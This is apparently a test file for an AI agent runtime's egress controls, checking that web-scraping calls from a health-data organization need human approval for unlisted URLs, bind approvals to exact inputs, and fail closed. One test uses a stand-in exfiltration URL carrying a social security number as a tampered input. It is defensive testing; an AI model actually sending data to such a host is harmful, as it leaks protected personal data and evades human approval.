import { describe, expect, test } from "bun:test";
import {
  RuntimeToolExecutionKnownFailureError,
  RuntimeToolPreparationRetryableError,
  runtimeToolInputHash,
  type RuntimeToolAllowedDecision,
  type RuntimeToolDecision,
} from "@deployments-ai/agent-runtime";
import {
  dataBoundaryOf,
  OrganizationDataBoundary,
  type EgressAllowlistEntry,
  type Ulid,
} from "@deployments-ai/db";
import { findPlatformToolAdapterDefinition } from "@deployments-ai/tools";
import { Schema } from "effect";
import type { RuntimeProviderMutationClaim } from "./provider-mutation-claims.ts";
import { createRuntimeToolService } from "./runtime-tool-authorization.ts";
import { ToolOutsideDataBoundaryError } from "./runtime-tool-call-authorization.ts";

const id = (suffix: string) => `01J000000000000000000000${suffix}` as Ulid;
const baseRequest = {
  agentDefinitionId: id("01"),
  agentDeploymentId: id("02"),
  agentReleaseId: id("03"),
  effect: "read" as const,
  environmentId: id("04"),
  idempotencyKey: "egress-call",
  inputSummary: "Scrape a page.",
  organizationId: id("05"),
  projectId: id("06"),
  requiredScopes: [],
  runId: id("07"),
  threadId: id("08"),
  toolName: "web.scrape",
};
const PHI = dataBoundaryOf(
  Schema.decodeUnknownSync(OrganizationDataBoundary)({
    operatorNote: "BAA-2026-17",
    profile: "phi",
    setAt: "2026-11-01T00:00:00.000Z",
    setBy: { kind: "operator", principalId: id("11") },
  }),
);
const ALLOWLIST: readonly EgressAllowlistEntry[] = [{ origin: "https://claims.example.com" }];
const LISTED = "https://claims.example.com/eligibility?member=A-1";
const UNLISTED = "https://labs.example.org/results?patient=Jane%20Doe&dob=1980-02-03";

const effectOf = (toolName: string) => findPlatformToolAdapterDefinition(toolName)!.effect;

function harness(options: {
  readonly allowlist?: EgressAllowlistEntry[];
  readonly allowlistFailure?: Error;
  readonly boundary?: typeof PHI;
}) {
  const allowlistReads: Ulid[] = [];
  const executed: unknown[] = [];
  let ids = 20;
  const runtime = createRuntimeToolService({
    builtinExecutors: {
      "code.execute": async () => ({ status: "completed" }),
      "web.batch_scrape": async (request) => {
        executed.push(request.input);
        return { outputSummary: "Scraped.", status: "completed" };
      },
      "web.scrape": async (request) => {
        executed.push(request.input);
        return { outputSummary: "Scraped.", status: "completed" };
      },
    },
    dataBoundaries: { read: async () => options.boundary ?? dataBoundaryOf(undefined) },
    egressAllowlists: {
      read: async (organizationId) => {
        allowlistReads.push(organizationId);
        if (options.allowlistFailure) throw options.allowlistFailure;
        return options.allowlist ?? ALLOWLIST;
      },
    },
    generateId: async () => id(String(ids++)),
    // web.batch_scrape is an outbound mutation; claims here always execute.
    mutationClaims: {
      begin: async (input) => ({
        action: "execute",
        claim: { input, record: {} as never } as RuntimeProviderMutationClaim,
      }),
      fail: async () => undefined,
      markUnknown: async () => undefined,
      release: async () => undefined,
      succeed: async () => undefined,
    },
    resolveAuthorizationContext: async () => undefined,
    resolveProviderCredential: async () => {
      throw new Error("Built-ins never load provider credentials.");
    },
  });
  const authorize = (input: Readonly<Record<string, unknown>>, toolName = "web.scrape") =>
    runtime.authorizeToolCall({
      ...baseRequest,
      effect: effectOf(toolName),
      input,
      toolName,
    });
  const execute = (
    input: Readonly<Record<string, unknown>>,
    decision: RuntimeToolAllowedDecision,
    approvalId?: Ulid,
    toolName = "web.scrape",
  ) =>
    runtime.executeToolCall({
      ...baseRequest,
      ...(approvalId ? { approvalId } : {}),
      decision,
      effect: effectOf(toolName),
      input,
      policyAction: approvalId ? "require-approval" : "allow",
      toolName,
    });
  return { allowlistReads, authorize, execute, executed, runtime };
}

/** The allow decision an approved continuation executes with. */
function approved(decision: RuntimeToolDecision): RuntimeToolAllowedDecision {
  if (decision.action !== "require-approval") throw new Error("Expected an approval decision.");
  return {
    action: "allow",
    ...(decision.executionBinding ? { executionBinding: decision.executionBinding } : {}),
    reason: decision.reason,
    toolCallId: decision.toolCallId,
  };
}

function allowed(decision: RuntimeToolDecision): RuntimeToolAllowedDecision {
  if (decision.action !== "allow") throw new Error(`Expected allow, got ${decision.action}.`);
  return decision;
}

const rejection = (promise: Promise<unknown>) =>
  promise.then(
    () => undefined,
    (cause: unknown) => cause,
  );

describe("per-call egress decisions in a phi organization", () => {
  test("advertises web.scrape and runs a call to an allowlisted origin without approval", async () => {
    const { authorize, execute, executed, runtime } = harness({ boundary: PHI });

    expect(await runtime.resolveToolDefinition("web.scrape", baseRequest)).toMatchObject({
      toolName: "web.scrape",
    });
    const decision = await authorize({ url: LISTED });
    expect(decision).toMatchObject({ action: "allow" });
    expect(decision).not.toHaveProperty("destinations");
    expect(await execute({ url: LISTED }, allowed(decision))).toMatchObject({
      status: "completed",
    });
    expect(executed).toEqual([{ url: LISTED }]);
  });

  test("asks a person to approve an unlisted URL, showing it in full and binding the input", async () => {
    const { authorize } = harness({ boundary: PHI });

    const decision = await authorize({ url: UNLISTED });

    expect(decision).toMatchObject({
      action: "require-approval",
      destinations: [UNLISTED],
      executionBinding: { inputHash: runtimeToolInputHash({ url: UNLISTED }) },
    });
    expect(decision.reason).toContain("outside this organization's phi data boundary");
  });

  test("runs the approved input and fails a changed input under the same approval", async () => {
    const { authorize, execute, executed } = harness({ boundary: PHI });
    const decision = await authorize({ url: UNLISTED });
    const approvalId = decision.action === "require-approval" ? decision.approvalId : undefined;

    const changed = await rejection(
      execute({ url: "https://exfil.example.net/?ssn=123" }, approved(decision), approvalId),
    );
    expect(changed).toBeInstanceOf(RuntimeToolExecutionKnownFailureError);
    expect((changed as Error).cause).toMatchObject({
      message: expect.stringContaining("outside this organization's phi data boundary"),
    });
    expect(executed).toEqual([]);

    const unapproved = await rejection(execute({ url: UNLISTED }, approved(decision)));
    expect(unapproved).toBeInstanceOf(RuntimeToolExecutionKnownFailureError);
    expect(executed).toEqual([]);

    expect(await execute({ url: UNLISTED }, approved(decision), approvalId)).toMatchObject({
      status: "completed",
    });
    expect(executed).toEqual([{ url: UNLISTED }]);
  });

  test("an approval covers only the destinations its approver saw, not an origin delisted later", async () => {
    const allowlist = [...ALLOWLIST];
    const { authorize, execute, executed } = harness({ allowlist, boundary: PHI });
    const input = { urls: [LISTED, UNLISTED] };
    const decision = await authorize(input, "web.batch_scrape");
    // The listed origin was allowlisted, so the approver saw only the unlisted URL.
    expect(decision).toMatchObject({ action: "require-approval", destinations: [UNLISTED] });
    const approvalId = decision.action === "require-approval" ? decision.approvalId : undefined;

    allowlist.splice(0);
    const delisted = await rejection(
      execute(input, approved(decision), approvalId, "web.batch_scrape"),
    );
    expect(delisted).toBeInstanceOf(RuntimeToolExecutionKnownFailureError);
    expect((delisted as Error).cause).toMatchObject({
      message: expect.stringContaining("No approval covers this call's destinations."),
    });
    expect(executed).toEqual([]);

    allowlist.push(...ALLOWLIST);
    expect(await execute(input, approved(decision), approvalId, "web.batch_scrape")).toMatchObject({
      status: "completed",
    });
    expect(executed).toEqual([input]);
  });

  test("an approval that covers no input hash does not cover an unlisted URL", async () => {
    // A policy approval granted before the organization gained its boundary named no destinations.
    const { execute, executed } = harness({ boundary: PHI });
    const open = harness({});
    const decision = allowed(await open.authorize({ url: UNLISTED }));

    const failure = await rejection(execute({ url: UNLISTED }, decision, id("31")));

    expect(failure).toBeInstanceOf(RuntimeToolExecutionKnownFailureError);
    expect(executed).toEqual([]);
  });

  test("still refuses code.execute at resolve and authorize", async () => {
    const { authorize, runtime } = harness({ boundary: PHI });

    const refused = await rejection(runtime.resolveToolDefinition("code.execute", baseRequest));
    expect(refused).toBeInstanceOf(ToolOutsideDataBoundaryError);
    expect(refused).toMatchObject({ code: "tool_outside_data_boundary" });
    expect(await authorize({ source: "fetch('https://x')" }, "code.execute")).toMatchObject({
      action: "deny",
    });
  });

  test("denies a call whose options run the web tools LLM, even to an allowlisted origin", async () => {
    const { authorize } = harness({ boundary: PHI });

    const decision = await authorize({ formats: ["json"], url: LISTED });

    expect(decision).toMatchObject({ action: "deny" });
    expect(decision.reason).toContain("outside this organization's phi data boundary");
    expect(decision.reason).toContain("web tools LLM");
  });

  test("fails closed when the allowlist cannot be read", async () => {
    const failure = new Error("allowlist read throttled");
    const { authorize, execute, executed } = harness({ allowlistFailure: failure, boundary: PHI });

    const atAuthorize = await rejection(authorize({ url: LISTED }));
    expect(atAuthorize).toBeInstanceOf(RuntimeToolPreparationRetryableError);
    expect((atAuthorize as RuntimeToolPreparationRetryableError).preparationCause).toBe(failure);

    const decision = {
      action: "allow",
      reason: "Allowed earlier.",
      toolCallId: id("30"),
    } as const;
    const atExecute = await rejection(execute({ url: LISTED }, decision));
    expect(atExecute).toBeInstanceOf(RuntimeToolPreparationRetryableError);
    expect(executed).toEqual([]);
  });
});

describe("per-call egress decisions in an open organization", () => {
  test("resolve, authorize, and execute never read the allowlist", async () => {
    const { allowlistReads, authorize, execute, executed, runtime } = harness({});

    expect(await runtime.resolveToolDefinition("web.scrape", baseRequest)).toMatchObject({
      toolName: "web.scrape",
    });
    const decision = allowed(await authorize({ url: UNLISTED }));
    expect(decision.executionBinding).not.toHaveProperty("inputHash");
    await execute({ url: UNLISTED }, decision);

    expect(executed).toEqual([{ url: UNLISTED }]);
    expect(allowlistReads).toEqual([]);
  });

  test("a built-in binding that pins an input hash runs only that input", async () => {
    const { authorize, execute, executed } = harness({});
    const decision = allowed(await authorize({ url: UNLISTED }));
    const pinned = {
      ...decision,
      executionBinding: {
        ...decision.executionBinding!,
        inputHash: runtimeToolInputHash({ url: UNLISTED }),
      },
    };

    expect(await rejection(execute({ url: LISTED }, pinned))).toBeInstanceOf(
      RuntimeToolExecutionKnownFailureError,
    );
    expect(executed).toEqual([]);
    await execute({ url: UNLISTED }, pinned);
    expect(executed).toEqual([{ url: UNLISTED }]);
  });
});
